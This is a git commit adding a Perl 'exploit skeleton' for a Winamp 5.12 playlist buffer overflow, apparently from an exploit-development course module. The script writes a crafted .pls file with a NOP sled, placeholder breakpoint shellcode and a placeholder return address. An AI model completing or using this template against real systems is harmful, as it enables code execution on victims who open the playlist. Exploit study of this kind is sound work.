c48f930cae7180f1a5827b1bab8b748c37e488e7
bigb0ss <49355913+bigb0ss-offsec@users.noreply.github.com>
2019-08-24 22:47:29 -0400

    Add files via upload

---
+++ module_0x06/winamp_template.pl
@@ -0,0 +1,21 @@
+#!/usr/bin/perl 
+#
+# ============================
+#          Winamp 5.12      
+#       Exploit Skeleton   
+#          by bigb0ss       
+# ============================
+
+
+$start= "[playlist]\r\nFile1=\\\\";
+$nop="\x90" x 856;
+$shellcode ="\xcc" x 166;
+$jmp="\x41\x41\x41\x41"."\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
+$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberofEntries=1\r\nVersion=2\r\n";
+open (MYFILE, '>>exploit.pls');
+print MYFILE $start;          
+print MYFILE $nop;            
+print MYFILE $shellcode;      
+print MYFILE $jmp;                
+print MYFILE $end;
+close (MYFILE);
